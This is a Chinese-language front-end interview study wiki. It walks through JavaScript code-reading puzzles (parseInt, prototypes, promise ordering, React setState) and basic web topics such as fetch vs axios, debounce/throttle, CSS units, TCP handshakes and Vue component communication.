
# README.md
# fe-interview-100-wiki

前端面试100问，课程电子书

# 分析解决问题\00-开始.md
# 开始

遇到一个需求、问题或者一段代码，如何能高效的分析、解决它，这是前端程序员的必备技能。否则你将无法独立工作，这不是企业需要的人才。本章将通过多个面试题，教你如何分析问题、解决问题。

## 为何要考察

遇到一个需求、问题或者一段代码，如何能高效的分析、解决它，这是前端程序员的必备技能。
否则你将无法独立工作，这不是企业需要的人才。

## 考察重点

能看懂代码的逻辑，识破代码的一些坑。

## 注意事项

暂无

## 看几个问题

参考视频。


# 分析解决问题\01-数组转树.md
# 数组转树

## 题目

定义一个 `convert` 函数，将以下数组转换为树结构。

```js
const arr = [
    { id: 1, name: '部门A', parentId: 0 }, // 0 代表顶级节点，无父节点
    { id: 2, name: '部门B', parentId: 1 },
    { id: 3, name: '部门C', parentId: 1 },
    { id: 4, name: '部门D', parentId: 2 },
    { id: 5, name: '部门E', parentId: 2 },
    { id: 6, name: '部门F', parentId: 3 },
]
```

![](./img/部门-树.png)

## 分析

定义树节点的数据结构

```ts
interface ITreeNode {
    id: number
    name: string
    children?: ITreeNode[]
}
```

遍历数组，针对每个元素
- 生成 tree node
- 找到 parentNode 并加入到它的 `children`

找 parentNode 时，需要根据 `id` 能**尽快**找到 tree node<br>
需要一个 map ，这样时间复杂度是 `O(1)` 。否则就需要遍历查找，时间复杂度高。

## 实现

代码参考 convert-arr-tree.ts

## 扩展

这两种数据结构很像 MySQL vs Mongodb ，一个关系型，一个文档型


# 分析解决问题\02-连环问-树转数组.md
# 树转数组

## 题目

定义一个 `convert` 函数，将以下对象转换为数组

```js
const obj = {
    id: 1,
    name: '部门A',
    children: [
        {
            id: 2,
            name: '部门B',
            children: [
                { id: 4, name: '部门D' },
                { id: 5, name: '部门E' }
            ]
        },
        {
            id: 3,
            name: '部门C',
            children: [{ id: 6, name: '部门F' }]
        }
    ]
}
```

```js
[
    { id: 1, name: '部门A', parentId: 0 }, // 0 代表顶级节点，无父节点
    { id: 2, name: '部门B', parentId: 1 },
    { id: 3, name: '部门C', parentId: 1 },
    { id: 4, name: '部门D', parentId: 2 },
    { id: 5, name: '部门E', parentId: 2 },
    { id: 6, name: '部门F', parentId: 3 },
]
```

## 分析

根据顺组的顺序，需要**广度优先**遍历树

要快速获取 `parentId` 需要存储 `nodeToParent` map 结构。

## 实现

代码参考 convert-tree-arr.ts


# 分析解决问题\03-map-parseInt.md
# map parseInt

## 题目

`['1', '2', '3'].map(parseInt)` 输出什么？

## parseInt

`parseInt(string, radix)` 解析一个字符串并返回指定基数的**十进制**整数
- `string` 要解析的字符串
- `radix` 可选参数，数字基数（即进制），范围为 2-36

示例

```js
parseInt('11', 1) // NaN ，1 非法，不在 2-36 范围之内
parseInt('11', 2) // 3 = 1*2 + 1
parseInt('3', 2) // NaN ，2 进制中不存在 3
parseInt('11', 3) // 4 = 1*3 + 1
parseInt('11', 8) // 9 = 1*8 + 1
parseInt('9', 8) // NaN ，8 进制中不存在 9
parseInt('11', 10) // 11
parseInt('A', 16) // 10 ，超过 10 进制，个位数就是 1 2 3 4 5 6 7 8 9 A B C D ...
parseInt('F', 16) // 15
parseInt('G', 16) // NaN ，16 进制个位数最多是 F ，不存在 G
parseInt('1F', 16) // 31 = 1*16 + F
```

## radix == null 或者 radix === 0

- 如果 `string` 以 `0x` 开头，则按照 16 进制处理，例如 `parseInt('0x1F')` 等同于 `parseInt('1F', 16)`
- 如果 `string` 以 `0` 开头，则按照 8 进制处理 —— **ES5 之后就取消了，改为按 10 进制处理，但不是所有浏览器都这样，一定注意！！！**
- 其他情况，按 10 进制处理

## 分析代码

题目代码可以拆解为

```js
const arr = ['1', '2', '3']
const res = arr.map((s, index) => {
    console.log(`s is ${s}, index is ${index}`)
    return parseInt(s, index)
})
console.log(res)
```

分析执行过程

```js
parseInt('1', 0) // 1 ，radix === 0 按 10 进制处理
parseInt('2', 1) // NaN ，radix === 1 非法（不在 2-36 之内）
parseInt('3', 2) // NaN ，2 进制中没有 3
```

## 答案

```js
['1', '2', '3'].map(parseInt) // [1, NaN, NaN]
```

## 划重点

- 要知道 `parseInt` 参数的定义
- 把代码拆解到最细粒度，再逐步分析

## 扩展

为何 eslint 建议 `partInt` 要指定 `radix`（第二个参数）？<br>
因为 `parseInt('011')` 无法确定是 8 进制还是 10 进制，因此必须给出明确指示。


# 分析解决问题\04-原型.md
# 原型

## 题目

以下代码，执行会输出什么？

```js
function Foo() {
    Foo.a = function() { console.log(1) }
    this.a = function() { console.log(2) }
}
Foo.prototype.a = function() { console.log(3) }
Foo.a = function() { console.log(4) }

Foo.a()
let obj = new Foo()
obj.a()
Foo.a()
```

## 分析

把自己想象成 JS 引擎，你不是在读代码，而是在执行代码 —— 定义的函数如果不执行，就不要去看它的内容 —— 这很重要！！！

按这个思路来“执行”代码

## 原型

![](./img/Foo原型.png)

## 答案

执行输出 `4 2 1`

## 重点

- 原型基础知识
- 你不是在读代码，而是在模拟执行代码


# 分析解决问题\05-promise调用顺序.md
# promise

## 题目

以下代码，执行会输出什么

```js
Promise.resolve().then(() => {
    console.log(0)
    return Promise.resolve(4)
}).then((res) => {
    console.log(res)
})

Promise.resolve().then(() => {
    console.log(1)
}).then(() => {
    console.log(2)
}).then(() => {
    console.log(3)
}).then(() => {
    console.log(5)
}).then(() =>{
    console.log(6)
})
```

## 这道题很难

网上有很多文章介绍这道题，都没有给出清晰的答案。

被称为“令人失眠的”题目

## 回顾

- 单线程和异步
- 事件循环
- 宏任务 微任务

## then 交替执行

如果有多个 fulfilled 状态的 promise 实例，同时执行 then 链式调用，then 会交替调用<br>
这是编译器的优化，防止一个 promise 持续占据事件

```js
Promise.resolve().then(() => {
    console.log(1)
}).then(() => {
    console.log(2)
}).then(() => {
    console.log(3)
}).then(() => {
    console.log(4)
})

Promise.resolve().then(() => {
    console.log(10)
}).then(() => {
    console.log(20)
}).then(() => {
    console.log(30)
}).then(() => {
    console.log(40)
})

Promise.resolve().then(() => {
    console.log(100)
}).then(() => {
    console.log(200)
}).then(() => {
    console.log(300)
}).then(() => {
    console.log(400)
})
```

## then 返回 promise 对象

当 then 返回 promise 对象时，可以认为是多出一个 promise 实例。

```js
Promise.resolve().then(() => {
    console.log(1)
    return Promise.resolve(100) // 相当于多处一个 promise 实例，如下注释的代码
}).then(res => {
    console.log(res)
}).then(() => {
    console.log(200)
}).then(() => {
    console.log(300)
}).then(() => {
    console.log(300)
})

Promise.resolve().then(() => {
    console.log(10)
}).then(() => {
    console.log(20)
}).then(() => {
    console.log(30)
}).then(() => {
    console.log(40)
})

// // 相当于新增一个 promise 实例 —— 但这个执行结果不一样，后面解释
// Promise.resolve(100).then(res => {
//     console.log(res)
// }).then(() => {
//     console.log(200)
// }).then(() => {
//     console.log(300)
// }).then(() => {
//     console.log(400)
// })
```

## “慢两拍”

then 返回 promise 实例和直接执行 `Promise.resolve()` 不一样，它需要等待两个过程
- promise 状态由 pending 变为 fulfilled
- then 函数挂载到 microTaskQueue

所以，它变现的会“慢两拍”。可以理解为

```js
Promise.resolve().then(() => {
    console.log(1)
})

Promise.resolve().then(() => {
    console.log(10)
}).then(() => {
    console.log(20)
}).then(() => {
    console.log(30)
}).then(() => {
    console.log(40)
})

Promise.resolve().then(() => {
    // 第一拍
    const p = Promise.resolve(100)
    Promise.resolve().then(() => {
        // 第二拍
        p.then(res => {
            console.log(res)
        }).then(() => {
            console.log(200)
        }).then(() => {
            console.log(300)
        }).then(() => {
            console.log(400)
        })
    })
})
```

## 答案

题目代码输出的结果是 `1 2 3 4 5 6`

## 重点

- 熟悉基础知识：事件循环 宏任务 微任务
- then 交替执行
- then 返回 promise 对象时“慢两拍”

PS：这里一直在微任务环境下，如果加入宏任务就不一样了


# 分析解决问题\06-react-setState.md
# setState

## 题目

React 中以下代码会输出什么

```js
class Example extends React.Component {
    constructor() {
      super()
      this.state = { val: 0 }
    }
  
    componentDidMount() {
      // this.state.val 初始值是 0 

      this.setState({val: this.state.val + 1})
      console.log(this.state.val)
  
      this.setState({val: this.state.val + 1})
      console.log(this.state.val)
  
      setTimeout(() => {
        this.setState({val: this.state.val + 1})
        console.log(this.state.val)
  
        this.setState({val: this.state.val + 1})
        console.log(this.state.val)
      }, 0)
    }
  
    render() {
      return <p>{this.state.val}</p>
    }
}
```

## setState 默认异步更新

```js
componentDidMount() {
  this.setState({val: this.state.val + 1}, () => {
    // 回调函数可以拿到最新值
    console.log('callback', this.state.val)
  })
  console.log(this.state.val) // 拿不到最新值
}
```

## setState 默认会合并

多次执行，最后 render 结果还是 `1`

```js
componentDidMount() {
  this.setState({val: this.state.val + 1})
  this.setState({val: this.state.val + 1})
  this.setState({val: this.state.val + 1})
}
```

## setState 有时同步更新

根据 `setState` 的**触发时机是否受 React 控制**

如果触发时机在 React 所控制的范围之内，则**异步更新**
- 生命周期内触发
- React JSX 事件内触发

如果触发时机不在 React 所控制的范围之内，则**同步更新**
- setTimeout setInterval
- 自定义的 DOM 事件
- Promise then
- ajax 网络请求回调

## setState 有时不会合并

第一，同步更新，不会合并

第二，传入函数，不会合并 （对象可以 `Object.assign`，函数无法合并）

```js
this.setState((prevState, props) => {
  return { val: prevState.val + 1 }
})
```

## 答案

题目代码执行打印 `0 0 2 3`

## 重点

`setState` 是 React 最重要的 API ，三点：
- 使用不可变数据
- 合并 vs 不合并
- 异步更新 vs 同步更新


# 分析解决问题\07-对象赋值.md
# 对象赋值

## 题目

以下代码，运行会输出什么

```js
let a = { n: 1 }
let b = a
a.x = a = { n: 2 }

console.log(a.x) 	
console.log(b.x)
```

## 值类型 vs 引用类型

```js
let a = 100
let b = a

let a = { n: 1 }
let b = a
```

![](./img/堆栈.png)

## 连续赋值

连续赋值是倒序执行。PS：日常工作不可用连续赋值，可读性差

```js
let n1, n2
n1 = n2 = 100

// // 相当于
// n2 = 100
// n1 = n2
```

## `.` 优先级更高

```js
let a = {}
a.x = 100

// 可拆解为：
// 1. a.x = undefined // 初始化 a.x 属性
// 2. a.x = 100 // 为 x 属性赋值

```

再看下面的例子

```js
let a = { n: 1 }
a.x = a = { n: 2 }

// // 可以拆解为
// a.x = undefined
// let x = a.x // x 变量是假想的，实际执行时不会有
// x = a = { n: 2 }
```

![](./img/堆栈2.png)

## 答案

题目代码执行打印 `undefined` 和 `{ n: 2 }`

其实把 `a.x = a = { n: 2 }` 换成 `b.x = a = { n: 2 }` 更好理解

或者把连续赋值拆分为 `a.x = { n: 2 }; a = { n: 2 }` （优先级高的，先执行）

## 重点

- 值类型和引用类型，堆栈模型
- 连续赋值（`.` 优先级更高）

PS：日常工作不可用连续赋值，可读性差


# 分析解决问题\08-对象属性赋值.md
# 对象属性赋值

## 题目

执行以下代码，会输出什么

```js
// example1
let a = {}, b = '123', c = 123
a[b] = 'b'
a[c] = 'c'
console.log(a[b])

// example 2
let a = {}, b = Symbol('123'), c = Symbol('123')
a[b] = 'b'
a[c] = 'c'
console.log(a[b])

// example 3
let a = {}, b = { key:'123' }, c = { key:'456' }
a[b] = 'b'
a[c] = 'c'
console.log(a[b])
```

## 对象的 key

- 对象的键名只能是字符串和 Symbol 类型
- 其他类型的键名会被转换成字符串类型
- 对象转字符串默认会调用 `toString` 方法

```js
const obj = {}
obj[0] = 100
const x = { s: 'abc' }
obj[x] = 200
const y = Symbol()
obj[y] = 300
const z = true
obj[z] = 400

Object.keys(obj) // ['0', '[object Object]', 'true']
```

有些类数组的结构是 `{ 0: x, 1: y, 2: z, length: 3 }` ，如 `document.getElementsByTagName('div')`<br>
实际上它的 key 是 `['0', '1', '2', 'length']`

## 答案

题目代码执行分别打印 `'c' 'b' 'c'`

## 扩展：Map 和 WeakMap

- Map 可以用任何类型值作为 `key`
- WeakMap 只能使用引用类型作为 `key` ，不能是值类型


# 分析解决问题\09-函数参数.md
# 函数参数

## 题目

运行以下代码，会输出什么

```js
function changeArg(x) { x = 200 }

let num = 100
changeArg(num)
console.log('changeArg num', num)

let obj = { name: '双越' }
changeArg(obj)
console.log('changeArg obj', obj)

function changeArgProp(x) {
    x.name = '张三'
}
changeArgProp(obj)
console.log('changeArgProp obj', obj)
```

## 分析

调用函数，传递参数 —— **赋值**传递

```js
function fn(x, y) {
    // 继续操作 x y
}
const num = 100
const obj = { name: '双越' }
fn(num, obj)
```

以上代码相当于

```js
const num = 100
const obj = { name: '双越' }

let x = num
let y = obj
// 继续操作 x y
```

## 解题

执行题目代码分别输出 `100  {name: '双越'}  {name: '张三'}`

## 扩展：

eslint 规则建议：函数参数当作一个 `const` 常量，不要修改函数参数 —— 这样代码更易读


# 分析解决问题\10-文本小节-解决问题的常见思路.md
# 解决问题的常见思路

## 举例

例如“数组转树”和“树转数组”两个问题，题目直接给出了示例，就很好理解。
如果你遇到一些搞不懂逻辑的问题，可以举几个例子。对比输入和输出，即可找出变化的规律。

另外，对于面试官出的问题，如果没有示例，你可以举几个示例让面试官确认，这样可以保证自己理解正确。

## 画图

遇到比较抽象的问题，拿纸币画图，把抽象变为形象，更容易找出突破口。
课程很多算法问题我们都是通过画图解决的。

## 拆解

例如 `['1', '2', '3'].map(parseInt)` ，把代码拆解到最细的力度，就很容易定位问题。

```js
const arr = ['1', '2', '3']
const res = arr.map((s, index) => {
    // console.log(`s is ${s}, index is ${index}`)
    return parseInt(s, index)
})
console.log(res)
```

## 识破本质

不要被问题看似复杂的表象所迷惑，要尝试去找出问题的本质，找出问题的考点。
例如下面对象属性赋值的问题，考点就是对象 key 的数据类型。

```js
let a = {}, b = '123', c = 123
a[b] = 'b'
a[c] = 'c'
console.log(a[b])
```


# 分析解决问题\11-总结.md
# 总结

## 内容总结

本章讲解分析解决问题的问题，包含很多“读代码”面试题。要能识别出代码的一些坑，得到正确的执行结果。

## 划重点

- 原型和原型链的实际执行结果
- promise 链式调用的执行顺序
- 函数参数是赋值拷贝

## 注意事项

- 读代码时，要模拟 JS 引擎去执行代码，而不是去阅读代码


# 前端基础知识\00-开始.md
# 前端基础知识

HTML CSS JS HTTP 等基础知识是前端面试的第一步，基础知识不过关将直接被拒。本章将通过多个面试题，讲解前端常考的基础知识面试题，同时复习一些重要的知识点。

## 为何要考察

扎实的前端基础知识，是作为前端工程师的根本。基础知识能保证最基本的使用，即招聘进来能干活，能产出。

## 考察的重点

- HTML CSS JS 基础知识
- HTTP Ajax 基础知识
- Vue 等框架的基本应用

## 注意事项

不会从 0 基础讲起，基础不熟悉可以向讲师提问

## 看几个面试题

列几个代表性的面试题，参考视频。


# 前端基础知识\01-ajax-fetch-axios-区别.md
# ajax fetch axios 的区别

## 题目

ajax fetch axios 的区别

## 分析

三者根本没有可比性，不要被题目搞混了。要说出他们的本质

## 传统 ajax

AJAX （几个单词首字母，按规范应该大写） - Asynchronous JavaScript and XML（异步的 JavaScript 和 XML）<br>
即使用 JS 进行异步请求，是 Web2.0 的技术基础，从 2005 年左右开始发起。<br>
所以，这里的 AJAX 就是一个称呼，一个缩写。

基于当时 JS 规范，异步请求主要使用 XMLHttpRequest 这个底层 API 。<br>
所以，有一道常考的面试题：请用 XMLHttpRequest 实现 ajax

```js
function ajax(url, successFn) {
    const xhr = new XMLHttpRequest()
    xhr.open("GET", url, false)
    xhr.onreadystatechange = function () {
        // 这里的函数异步执行，可参考之前 JS 基础中的异步模块
        if (xhr.readyState == 4) {
            if (xhr.status == 200) {
                successFn(xhr.responseText)
            }
        }
    }
    xhr.send(null)
}
```

## fetch

fetch 是一个原生 API ，它和 XMLHttpRequest 一个级别。

fetch 和 XMLHttpRequest 的区别
- 写法更加简洁
- 原生支持 promise

面试题：用 fetch 实现一个 ajax

```js
function ajax(url) {
    return fetch(url).then(res => res.json())
}
```

## axios

axios 是一个[第三方库](https://www.npmjs.com/package/axios)，随着 Vue 一起崛起。它和 jquery 一样（jquery 也有 ajax 功能）。

axios 内部可以用 XMLHttpRequest 或者 fetch 实现。

## 答案

- ajax 是一种技术称呼，不是具体的 API 和库
- fetch 是新的异步请求 API ，可代替 XMLHttpRequest
- axios 是第三方库

## 划重点

- 注意 库 和 API 的区别
- 实际项目要用库，尽量不要自己造轮子（除非有其他目的）

## 思考

库 和 框架 有什么区别？


# 前端基础知识\02-节流和防抖.md
# 节流和防抖

## 题目

节流和防抖有何区别？分别用于什么场景？

## 防抖

防抖，即防止抖动。抖动着就先不管它，等啥时候静止了，再做操作。

例如，一个搜索输入框，等输入停止之后，自动执行搜索。

代码参考 `debounce.html`

## 节流

节流，即节省交互沟通。流，可理解为交流，不一定会产生网络流量。

例如，drag 的回调，上传进度的回调，都可以设置一个固定的频率，没必要那么频繁。

代码参考 `throttle.html`

## 答案

防抖和节流都用于处理频繁触发的操作，优化操作体验。

触发频率
- 防抖，不固定
- 节流，固定

场景
- 防抖，结果式，即一次调用即可
- 节流，过程式，即需要持续一个过程，一次不够

## 划重点

- 抓住“触发频率”是否固定，即可抓住重点
- 实际项目推荐使用 lodash


# 前端基础知识\03-px-em-rem-vw-vh-区别.md
# px em rem vw/vh 的区别

## 题目

px % em rem vw/vh 的区别

## px

像素，基本单位

## %

相对于父元素的尺寸。

如根据 `position: absolute;` 居中显示时，需要设置 `left: 50%`

```css
.container {
    with: 200px;
    height: 200px;
    position: relative;
}
.box {
    with: 100px;
    height: 100px;
    position: absolute;
    left: 50%;
    top: 50%;
    margin-top: -50px;
    margin-left: -50px;
}
```

## em

相对于当前元素的 `font-size`。首行缩进可以使用 `text-indent: 2em`。

## rem

rem = root em

相对于根元素的 `font-size` 。可以根据媒体查询，设置根元素的 `font-size` ，实现移动端适配。

```css
@media only screen and (max-width: 374px) {
    /* iphone5 或者更小的尺寸，以 iphone5 的宽度（320px）比例设置 font-size */
    html {
        font-size: 86px;
    }
}
@media only screen and (min-width: 375px) and (max-width: 413px) {
    /* iphone6/7/8 和 iphone x */
    html {
        font-size: 100px;
    }
}
@media only screen and (min-width: 414px) {
    /* iphone6p 或者更大的尺寸，以 iphone6p 的宽度（414px）比例设置 font-size */
    html {
        font-size: 110px;
    }
}
```

## vw/vh

- vw 屏幕宽度的 1%
- vh 屏幕高度的 1%
- vmin 两者最小值
- vmax 两者最大值


# 前端基础知识\04-箭头函数的缺点.md
# 箭头函数的缺点

## 题目

什么时候不能使用箭头函数？

## 箭头函数的缺点

没有 arguments

```js
const fn1 = () => {
    console.log('this', arguments) // 报错，arguments is not defined
}
fn1(100, 200)
```

无法通过 call apply bind 等改变 this

```js
const fn1 = () => {
    console.log('this', this) // window
}
fn1.call({ x: 100 })
```

简写的函数会变得难以阅读

```js
const multiply = (a, b) => b === undefined ? b => a * b : a * b
```

## 不适用箭头函数的场景

对象方法

```js
const obj = {
    name: '双越',
    getName: () => {
        return this.name
    }
}
console.log( obj.getName() )
```

扩展对象原型（包括构造函数的原型）

```js
const obj = {
    name: '双越'
}
obj.__proto__.getName = () => {
    return this.name
}
console.log( obj.getName() )
```

构造函数

```js
const Foo = (name, age) => {
    this.name = name
    this.age = age
}
const f = new Foo('张三', 20) // 报错 Foo is not a constructor
```

动态上下文中的回调函数

```js
const btn1 = document.getElementById('btn1')
btn1.addEventListener('click', () => {  
    // console.log(this === window)
    this.innerHTML = 'clicked'
})
```

Vue 生命周期和方法

```js
{
    data() { return { name: '双越' } },
    methods: {
        getName: () => {
            // 报错 Cannot read properties of undefined (reading 'name')
            return this.name
        },
        // getName() {
        //     return this.name // 正常
        // }
    },
    mounted: () => {
        // 报错 Cannot read properties of undefined (reading 'name')
        console.log('msg', this.name)
    },
    // mounted() {
    //     console.log('msg', this.name) // 正常
    // }
}
```

【注意】class 中使用箭头函数则**没问题**

```js
class Foo {
    constructor(name, age) {
        this.name = name
        this.age = age
    }
    getName = () => {
        return this.name
    }
}
const f = new Foo('张三', 20)
console.log('getName', f.getName())
```

所以，在 React 中可以使用箭头函数

```js
export default class HelloWorld extends React.Component {
    constructor(props) {
        super(props)
        this.state = {
            name: '双越'
        }
    }
    render() {
        return <p onClick={this.printName}>hello world</p>
    }
    printName = () => {
        console.log(this.state.name)
    }
}
```

## 答案

箭头函数的缺点
- arguments 参数
- 无法改变 this

不适用的场景
- 对象方法
- 对象原型
- 构造函数
- 动态上下文
- Vue 生命周期和方法

## 划重点

- Vue 组件是一个对象，而 React 组件是一个 class （如果不考虑 Composition API 和 Hooks）


# 前端基础知识\05-TCP三次握手四次挥手.md
# TCP 连接 三次握手 四次挥手

## 题目

请描述 TCP 连接的 三次握手 和 四次挥手

## 建立连接

客户端和服务端通过 HTTP 协议发送请求，并获取内容。

在发送请求之前，需要先建立连接，确定目标机器处于可接受请求的状态。<br>
就例如，你要请快递员（第三方的）去张三家取一个东西，你必须先打电话问问他在不在家。这就是建立连接的过程。

HTTP 协议是一个应用层的协议，它只规定了 req 和 res 的数据格式，如状态码、header、body 等。<br>
而建立网络连接需要更加底层的 TCP 协议。

## 三次握手

三次握手，即建立一次 TCP 连接时，客户端和服务端总共需要发送 3 个包。

先举一个例子。还是你要派人去张三家取一个东西，现在你要发短信（不是打电话）“建立连接”，至少需要 3 个步骤，缺一不可。
- 你：在家吗？
- 张三：在家
- 你：好，这就过去（然后你指派人上门，张三准备迎接）

过程
- 客户端发包，服务端收到。服务端确认：客户端的发送能力是正常的。
- 服务端发包，客户端收到。客户端确认：服务端的接收能力是正常的。
- 客户端发包，服务端收到。服务端确认：客户端即将给我发送数据，我要准备接收。

建立连接完成，然后就开始发送数据，通讯。

## 四次挥手

握手，是建立连接。挥手，就是告别，就是关闭连接。

还是之前的例子。取东西，不一定一次就取完，可能要来回很多次。而且，也不一定全部由你主动发起，过程中张三也可能会主动派人给你发送。<br>
即，你在 chrome 中看到的是一次 http 请求，其实背后可能需要好几次网络传输，只不过浏览器给合并起来了。

好了，取东西完毕了，你要发短信“关闭连接”，告诉张三可以关门了，需要 4 个步骤。<br>
【注意】这里你需要等着确认张三关门，才算是完全关闭连接，不能你说一声就不管了。跟日常生活不一样。

- 你：完事儿了
- 张三：好的 （此时可能还要继续给你发送，你也得继续接收。直到张三发送完）
- 张三：我发送完毕，准备关门了
- 你：好，关门吧 （然后你可以走了，张三可以关门了，连接结束）

过程
- 客户端发包，服务端接收。服务端确认：客户端已经请求结束
- 服务端发包，客户端接收。客户端确认：服务端已经收到，我等待它关闭
- 服务端发包：客户端接受。客户端确认：服务端已经发送完成，可以关闭
- 客户端发包，服务端接收。服务端确认：可以关闭了

## 图示

![](./img/TCP三次握手和四次挥手.png)


# 前端基础知识\06-for-in和for-of的区别.md
# for...in 和 for...of 的区别

# 题目

for...in 和 for...of 的区别

## key 和 value

for...in 遍历 key , for...of 遍历 value

```js
const arr = [10, 20, 30]
for (let n of arr) {
    console.log(n)
}

const str = 'abc'
for (let s of str) {
    console.log(s)
}
```

```js
function fn() {
    for (let argument of arguments) {
        console.log(argument) // for...of 可以获取 value ，而 for...in 获取 key
    }
}
fn(10, 20, 30)

const pList = document.querySelectorAll('p')
for (let p of pList) {
    console.log(p) // for...of 可以获取 value ，而 for...in 获取 key
}
```

## 遍历对象

for...in 可以遍历对象，for...of 不可以

## 遍历 Map/Set

for...of 可以遍历 Map/Set ，for...in 不可以

```js
const set1 = new Set([10, 20, 30])
for (let n of set1) {
    console.log(n)
}

let map1 = new Map([
    ['x', 10], ['y', 20], ['z', 3]
])
for (let n of map1) {
    console.log(n)
}
```

## 遍历 generator

for...of 可遍历 generator ，for...in 不可以

```js
function* foo(){
  yield 10
  yield 20
  yield 30
}
for (let o of foo()) {
  console.log(o)
}
```

## 对象的可枚举属性

for...in 遍历一个对象的可枚举属性。

使用 `Object.getOwnPropertyDescriptors(obj)` 可以获取对象的所有属性描述，看 ` enumerable: true` 来判断该属性是否可枚举。

对象，数组，字符传

## 可迭代对象

for...of 遍历一个可迭代对象。<br>
其实就是迭代器模式，通过一个 `next` 方法返回下一个元素。

该对象要实现一个 `[Symbol.iterator]` 方法，其中返回一个 `next` 函数，用于返回下一个 value（不是 key）。<br>
可以执行 `arr[Symbol.iterator]()` 看一下。

JS 中内置迭代器的类型有 `String` `Array` `arguments` `NodeList` `Map` `Set` `generator` 等。

## 答案

- for...in 遍历一个对象的可枚举属性，如对象、数组、字符串。针对属性，所以获得 key
- for...of 遍历一个可迭代对象，如数组、字符串、Map/Set 。针对一个迭代对象，所以获得 value

## 划重点

“枚举” “迭代” 都是计算机语言的一些基础术语，目前搞不懂也没关系。<br>
但请一定记住 for...of 和 for...in 的不同表现。

## 连环问：for await...of

用于遍历异步请求的可迭代对象。

```js
// 像定义一个创建 promise 的函数
function createTimeoutPromise(val) {
    return new Promise(resolve => {
        setTimeout(() => {
            resolve(val)
        }, 1000)
    })
}
```

如果你明确知道有几个 promise 对象，那直接处理即可

```js
(async function () {
    const p1 = createTimeoutPromise(10)
    const p2 = createTimeoutPromise(20)

    const v1 = await p1
    console.log(v1)
    const v2 = await p2
    console.log(v2)
})()
```

如果你有一个对象，里面有 N 个 promise 对象，你可以这样处理

```js
(async function () {
    const list = [
        createTimeoutPromise(10),
        createTimeoutPromise(20)
    ]

    // 第一，使用 Promise.all 执行
    Promise.all(list).then(res => console.log(res))

    // 第二，使用 for await ... of 遍历执行
    for await (let p of list) {
        console.log(p)
    }

    // 注意，如果用 for...of 只能遍历出各个 promise 对象，而不能触发 await 执行
})()
```

【注意】如果你想顺序执行，只能延迟创建 promise 对象，而不能及早创建。<br>
即，你创建了 promise 对象，它就立刻开始执行逻辑。

```js
(async function () {
    const v1 = await createTimeoutPromise(10)
    console.log(v1)
    const v2 = await createTimeoutPromise(20)
    console.log(v2)

    for (let n of [100, 200]) {
        const v = await createTimeoutPromise(n)
        console.log('v', v)
    }
})()
```


# 前端基础知识\07-offsetHeight-scrollHeight-clientHeight-区别.md
# offsetHeight scrollHeight clientHeight 区别

## 题目

offsetHeight scrollHeight clientHeight 区别

## 盒子模型

- width height
- padding
- border
- margin
- **box-sizing**

## offsetHeight offsetWidth

包括：border + padding + content

## clientHeight clientWidth

包括：padding + content

## scrollHeight scrollWidth

包括：padding + 实际内容的尺寸

## scrollTop scrollLeft

DOM 内部元素滚动的距离

## 答案

- offsetHeight - border + padding + content
- clientHeight - padding + content
- scrollHeight - padding + 实际内容的高度

---

代码参考 offset-height.html


# 前端基础知识\08-HTMLCollection-NodeList-区别.md
# HTMLCollection 和 NodeList 的区别

## 题目

HTMLCollection 和 NodeList 的区别，Node 和 Element 的区别

## Node 和 Element

DOM 结构是一棵树，树的所有节点都是 `Node` ，包括：document，元素，文本，注释，fragment 等

`Element` 继承于 Node 。它是所有 html 元素的基类，如 `HTMLParagraphElement` `HTMLDivElement`

```js
class Node {}

// document
class Document extends Node {}
class DocumentFragment extends Node {}

// 文本和注释
class CharacterData extends Node {}
class Comment extends CharacterData {}
class Text extends CharacterData {}

// elem
class Element extends Node {}
class HTMLElement extends Element {}
class HTMLParagraphElement extends HTMLElement {}
class HTMLDivElement extends HTMLElement {}
// ... 其他 elem ...
```

## HTMLCollection 和 NodeList

HTMLCollection 是 Element 集合，它由获取 Element 的 API 返回
- `elem.children`
- `document.getElementsByTagName('p')`

NodeList 是 Node 集合，它由获取 Node 的 API 返回
- `document.querySelectorAll('p')`
- `elem.childNodes`

## 答案

- HTMLCollection 是 Element 集合，NodeList 是 Node 集合
- Node 是所有 DOM 节点的基类，Element 是 html 元素的基类

## 划重点

注意 Node 和 Element 在实际 API 中的区别，如 `children` 和 `childNodes` 获取的结果可能是不一样的（如果子节点有 Text 或 Comment）

## 扩展：类数组

HTMLCollection 和 NodeList 都不是数组，而是“类数组”。转换为数组：

```js
// HTMLCollection 和 NodeList 都不是数组，而是“类数组”
const arr1 = Array.from(list)
const arr2 = Array.prototype.slice.call(list)
const arr3 = [...list]
```


# 前端基础知识\09-vue-computed-watch-区别.md
# Vue computed 和 watch 区别

## 题目

Vue computed 和 watch 区别

## 两者设计用途不同

- computed 用于产出二次处理之后的数据，如对于一个列表进行 filter 处理
- watch 用于监听数据变化（如 v-model 时，数据可能被动改变，需要监听才能拿到）

## computed 有缓存

- computed 有缓存，data 不变则缓存不失效
- methods 无缓存，实时计算

## 答案

- computed 就已有数据产出新数据，有缓存
- watch 监听已有数据

---

代码参考 WatchAndComputed.vue


# 前端基础知识\10-vue组件通讯.md
# Vue 组件通讯

## 题目

Vue 组件通讯有几种方式，尽量全面

## props / $emit

适用于父子组件。

- 父组件向子组件传递 props 和事件
- 子组件接收 props ，使用 `this.$emit` 调用事件

## 自定义事件

适用于兄弟组件，或者“距离”较远的组件。

常用 API
- 绑定事件 `event.on(key, fn)` 或 `event.once(key, fn)`
- 触发事件 `event.emit(key, data)`
- 解绑事件 `event.off(key, fn)`

Vue 版本的区别
- Vue 2.x 可以使用 Vue 实例作为自定义事件
- Vue 3.x 需要使用第三方的自定义事件，例如 https://www.npmjs.com/package/event-emitter

【注意】组件销毁时记得 `off` 事件，否则可能会造成内存泄漏

## $attrs

`$attrs` 存储是父组件中传递过来的，且未在 `props` 和 `emits` 中定义的属性和事件。<br>
相当于 `props` 和 `emits` 的一个补充。

继续向下级传递，可以使用 `v-bind="$attrs"`。这会在下级组件中渲染 DOM 属性，可以用 `inheritAttrs: false` 避免。

【注意】Vue3 中移除了 `$listeners` ，合并到了 `$attrs` 中。

## $parent

通过 `this.$parent` 可以获取父组件，并可以继续获取属性、调用方法等。

【注意】Vue3 中移除了 `$children` ，建议使用 `$refs`

## $refs

通过 `this.$refs.xxx` 可以获取某个子组件，前提是模板中要设置 `ref="xxx"`。

【注意】要在 `mounted` 中获取 `this.$refs` ，不能在 `created` 中获取。

## provide / inject

父子组件通讯方式非常多。如果是多层级的上下级组件通讯，可以使用 provide 和 inject 。<br>
在上级组件定一个 provide ，下级组件即可通过 inject 接收。

- 传递静态数据直接使用 `provide: { x: 10 }` 形式
